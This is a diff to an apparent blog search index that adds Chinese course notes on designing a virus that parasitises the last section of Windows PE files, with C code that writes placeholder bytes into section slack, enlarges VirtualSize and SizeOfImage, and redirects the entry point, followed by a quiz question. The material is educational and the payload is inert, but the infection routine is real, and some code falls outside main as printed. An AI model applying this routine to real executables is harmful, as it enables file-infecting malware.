@@ -319,6 +319,47 @@
       </tags>
   </entry>
   <entry>
+    <title>病毒_Win_末节寄生程序设计</title>
+    <url>/archives/3ac768f6.html</url>
+    <content><![CDATA[<h2 id="末节大小不变的寄生"><a class="markdownIt-Anchor" href="#末节大小不变的寄生"></a> 末节大小不变的寄生</h2>
+<h3 id="需要修改的地方"><a class="markdownIt-Anchor" href="#需要修改的地方"></a> 需要修改的地方</h3>
+<ol>
+<li>填写eb 02 90 90机器码（病毒机器码）</li>
+<li>修改AddressOfEntryPoint</li>
+<li>修改节的VirtualSize</li>
+<li>节的SizeOfRawData不需要修改</li>
+<li>可选映像头SizeOfImage</li>
+</ol>
+<span id="more"></span>
+<h3 id="程序设计"><a class="markdownIt-Anchor" href="#程序设计"></a> 程序设计</h3>
+<p><img src="/images/%E7%97%85%E6%AF%92-Win-%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20210519091939767.png" alt="image-20210519091939767" /></p>
+<h3 id="具体代码"><a class="markdownIt-Anchor" href="#具体代码"></a> 具体代码</h3>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="comment">// 4个字节，放病毒代码 EB 02 09 09</span></span><br><span class="line"><span class="keyword">char</span> code[<span class="number">4</span>];</span><br><span class="line"><span class="comment">//DOS头字段e_lfanew字段偏移0x3c</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> OFFSET_OPTHDR_START 0x3c   </span></span><br><span class="line"><span class="comment">//变量ntHdrs  PE文件头（NT头）</span></span><br><span class="line">IMAGE_NT_HEADERS ntHdrs;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//该函数将文件指针定位到NT头</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">locateNTHdrStart</span><span class="params">(FILE * fp)</span>   	 </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> hdrStart;    		<span class="comment">//4个字节，放NT头的偏移量</span></span><br><span class="line">	fseek(fp, OFFSET_OPTHDR_START, SEEK_SET); 	<span class="comment">//定位到e_lfanew字段，0x3c位置</span></span><br><span class="line">	fread(&amp;hdrStart, <span class="keyword">sizeof</span>(hdrStart), <span class="number">1</span>, fp); 		<span class="comment">//读e_lfanew的值到hdrStart</span></span><br><span class="line">	fseek(fp, hdrStart, SEEK_SET);               		<span class="comment">//定位到NT头</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//该函数读入整个NT头</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readHdrs</span><span class="params">(FILE * fp)</span>            		 </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	locateNTHdrStart(fp);</span><br><span class="line">	fread(&amp;ntHdrs, <span class="keyword">sizeof</span>(ntHdrs), <span class="number">1</span>, fp);  	<span class="comment">//取出一个PE头大小的数据到ntHdrs</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//该函数生成寄生的病毒代码 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	code[<span class="number">0</span>] = <span class="number">0xEB</span>;</span><br><span class="line">	code[<span class="number">1</span>] = <span class="number">0x02</span>;</span><br><span class="line">	code[<span class="number">2</span>] = <span class="number">0x90</span>;</span><br><span class="line">	code[<span class="number">3</span>] = <span class="number">0x90</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获得病毒代码以及读文件NT头的主函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argC, <span class="keyword">char</span> ** args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//获得病毒代码</span></span><br><span class="line">getCode();  	</span><br><span class="line"><span class="comment">//打开命令行参数args[1]给出的文件</span></span><br><span class="line">FILE * fp;    	</span><br><span class="line">fp = fopen(args[<span class="number">1</span>], “rb+”);   </span><br><span class="line"><span class="comment">//读入文件的NT头</span></span><br><span class="line">readHdrs(fp);      	</span><br><span class="line">&#125;</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"><span class="comment">//以下代码为找到最后一个节并判断是否有空洞，此时文件指针正好指向节表项起始的位置</span></span><br><span class="line">	<span class="comment">// 获得节的数量</span></span><br><span class="line">	<span class="keyword">int</span> sectionNum = ntHdrs.FileHeader.NumberOfSections;   <span class="comment">//映像文件头中获得节的总数量</span></span><br><span class="line">	<span class="comment">// 定位到最后一个节表项</span></span><br><span class="line">	fseek(fp, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER) * (sectionNum - <span class="number">1</span>), SEEK_CUR); 	IMAGE_SECTION_HEADER lastSectionHdr;   	<span class="comment">//winnt.h给出了节表项的结构体</span></span><br><span class="line">	fread(&amp;lastSectionHdr, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), <span class="number">1</span>, fp);	    <span class="comment">//读入最后节的节表项</span></span><br><span class="line">	<span class="comment">// 判断最后一节是否有寄生的空洞</span></span><br><span class="line">	<span class="keyword">if</span> (lastSectionHdr.SizeOfRawData - lastSectionHdr.Misc.VirtualSize &lt; <span class="number">4</span>)</span><br><span class="line">	&#123;	<span class="comment">//如果最后段的填充部分不够寄生代码的长度，无法寄生，就退出不感染</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;the last section has not enough space to save virus\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改最后一个节的VirtualSize，在最后一个节写入寄生的病毒代码</span></span><br><span class="line">	<span class="comment">//修改最后节的VirtualSize</span></span><br><span class="line">	 <span class="comment">//之前读了最后一个节表项，重新定位回去</span></span><br><span class="line">	fseek(fp, - <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), SEEK_CUR);  </span><br><span class="line">	 <span class="comment">//后移8个字节跳过name字段，定位到VirtualSize字段</span></span><br><span class="line">	fseek(fp, <span class="number">8</span>, SEEK_CUR);		</span><br><span class="line">	<span class="keyword">int</span> newVirtualSize = lastSectionHdr.Misc.VirtualSize + <span class="number">4</span>;    <span class="comment">//计算新的VirtualSize的值</span></span><br><span class="line">	fwrite(&amp;newVirtualSize, <span class="keyword">sizeof</span>(newVirtualSize), <span class="number">1</span>, fp);	    <span class="comment">//写入新VirutalSize值到文件中</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//写入寄生代码</span></span><br><span class="line">	<span class="comment">//寄生位置：最后一个节的起始位置PointerToRawData + 原来的VirtualSize</span></span><br><span class="line">	fseek(fp, lastSectionHdr.PointerToRawData + lastSectionHdr.Misc.VirtualSize , SEEK_SET);</span><br><span class="line">	fwrite(code, <span class="number">4</span>, <span class="number">1</span>, fp);		<span class="comment">//写4字节的寄生代码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改SizeOfImage和EntryPoint</span></span><br><span class="line"><span class="comment">//1. 获取AddressOfEntry和SizeOfImage字段到NT头的偏移量</span></span><br><span class="line"><span class="keyword">int</span> offsetEntry = (<span class="keyword">int</span>)&amp;((IMAGE_NT_HEADERS *)<span class="number">0</span> )-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line"><span class="keyword">int</span> offsetImageSize = (<span class="keyword">int</span>)&amp;((IMAGE_NT_HEADERS *)<span class="number">0</span> )-&gt;OptionalHeader.SizeOfImage;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 修改SizeOfImage  （文件指针在NT头）</span></span><br><span class="line">locateNTHdrStart(fp);                      <span class="comment">//重新定位到NT头</span></span><br><span class="line">fseek(fp, offsetImageSize, SEEK_CUR);                    <span class="comment">// 定位到字段SizeOfImage</span></span><br><span class="line"><span class="comment">//  ( RVA + VirtualSize + 4  /  SectionAlignment ) 向上取整</span></span><br><span class="line"><span class="keyword">int</span> accurateSize = (lastSectionHdr.VirtualAddress + lastSectionHdr.Misc.VirtualSize + <span class="number">4</span>); </span><br><span class="line"><span class="keyword">int</span> pageNum = accurateSize  / ntHdrs.OptionalHeader.SectionAlignment;   </span><br><span class="line"><span class="keyword">int</span> imageSize = (pageNum) * ntHdrs.OptionalHeader.SectionAlignment &lt; accurateSize ? </span><br><span class="line">                   (pageNum + <span class="number">1</span>) * ntHdrs.OptionalHeader.SectionAlignment : accurateSize;   <span class="comment">//取上整</span></span><br><span class="line"><span class="comment">// 写入新的SizeOfImage值</span></span><br><span class="line">fwrite(&amp;imageSize, <span class="keyword">sizeof</span>(imageSize), <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 修改入口点AddressOfEntryPoint</span></span><br><span class="line">locateNTHdrStart(fp);		<span class="comment">//重新定位文件指针到NT头</span></span><br><span class="line">fseek(fp, offsetEntry, SEEK_CUR);	<span class="comment">//定位到AdressOfEntryPoint字段</span></span><br><span class="line"><span class="comment">// 新的入口RVA = 最后节的起始RVA + 最后节原来的VirtualSize，这样就指向寄生代码起始了</span></span><br><span class="line"><span class="keyword">int</span> entry = lastSectionHdr.VirtualAddress + lastSectionHdr.Misc.VirtualSize;</span><br><span class="line">fwrite(&amp;entry, <span class="keyword">sizeof</span>(entry), <span class="number">1</span>, fp);	<span class="comment">//写新的入口RVA</span></span><br><span class="line">fclose(fp);</span><br></pre></td></tr></table></figure>
+<h3 id="返回原始程序"><a class="markdownIt-Anchor" href="#返回原始程序"></a> 返回原始程序</h3>
+<p>在病毒代码最后增加JMP xx xx xx xx</p>
+<p>位移量如何计算？</p>
+<p><img src="/images/%E7%97%85%E6%AF%92-Win-%E6%9C%AB%E8%8A%82%E5%AF%84%E7%94%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/image-20210519093251556.png" alt="image-20210519093251556" /></p>
+<h3 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h3>
+<ol>
+<li>将病毒寄生在末节空洞的程序设计中，下列说法不正确的是（       ）<br />
+A.  &lt;windows.h&gt;和&lt;winnt.h&gt;提供了PE文件头相关的结构体定义<br />
+B.  病毒程序想访问AddressOfEntryPoint时，可以先将NT头信息由文件读到相应的结构体变量中<br />
+C.  病毒程序需要生成寄生到原文件的病毒代码<br />
+D.  寄生完成后，病毒程序需要修改结构体变量中的成员virtualSize和imageSize来确保寄生的病毒代码被加载到内存</li>
+</ol>
+<p>参考答案：D</p>
+<p>解析：病毒程序没有修改结构体变量中的成员，而是直接更改文件</p>
+]]></content>
+      <categories>
+        <category>病毒</category>
+      </categories>
+      <tags>
+        <tag>课程</tag>
+        <tag>计算机</tag>
+        <tag>病毒</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>病毒_Win_PE结构和末节寄生</title>
     <url>/archives/20191e8a.html</url>
     <content><![CDATA[<h2 id="pe格式"><a class="markdownIt-Anchor" href="#pe格式"></a> PE格式</h2>
@@ -486,8 +527,8 @@ D. 病毒可以将自身且分为多段，分别插入到PE文件各节的空洞
       </categories>
       <tags>
         <tag>课程</tag>
-        <tag>病毒</tag>
         <tag>计算机</tag>
+        <tag>病毒</tag>
       </tags>
   </entry>
   <entry>
@@ -565,8 +606,8 @@ D. 病毒可以将自身且分为多段，分别插入到PE文件各节的空洞
       </categories>
       <tags>
         <tag>课程</tag>
-        <tag>病毒</tag>
         <tag>计算机</tag>
+        <tag>病毒</tag>
       </tags>
   </entry>
   <entry>
@@ -621,8 +662,8 @@ D. 病毒可以将自身且分为多段，分别插入到PE文件各节的空洞
       </categories>
       <tags>
         <tag>课程</tag>
-        <tag>病毒</tag>
         <tag>计算机</tag>
+        <tag>病毒</tag>
       </tags>
   </entry>
   <entry>
@@ -717,8 +758,8 @@ D. 中断型病毒是通过替换原中断处理程序获得执行机会</li>
       </categories>
       <tags>
         <tag>课程</tag>
-        <tag>病毒</tag>
         <tag>计算机</tag>
+        <tag>病毒</tag>
       </tags>
   </entry>
   <entry>
@@ -921,8 +962,8 @@ D. 被调函数通过EBP-偏移访问自己的局部变量</li>
       </categories>
       <tags>
         <tag>课程</tag>
-        <tag>病毒</tag>
         <tag>计算机</tag>
+        <tag>病毒</tag>
       </tags>
   </entry>
   <entry>
@@ -1016,8 +1057,8 @@ D. 被调函数通过EBP-偏移访问自己的局部变量</li>
       </categories>
       <tags>
         <tag>课程</tag>
-        <tag>病毒</tag>
         <tag>计算机</tag>
+        <tag>病毒</tag>
       </tags>
   </entry>
   <entry>
@@ -1928,8 +1969,8 @@ eg：</p>
       </categories>
       <tags>
         <tag>课程</tag>
-        <tag>病毒</tag>
         <tag>计算机</tag>
+        <tag>病毒</tag>
       </tags>
   </entry>
   <entry>
@@ -1960,8 +2001,8 @@ eg：</p>
       </categories>
       <tags>
         <tag>课程</tag>
-        <tag>病毒</tag>
         <tag>计算机</tag>
+        <tag>病毒</tag>
       </tags>
   </entry>
   <entry>
@@ -2040,8 +2081,8 @@ eg：</p>
       </categories>
       <tags>
         <tag>课程</tag>
-        <tag>病毒</tag>
         <tag>计算机</tag>
+        <tag>病毒</tag>
       </tags>
   </entry>
   <entry>
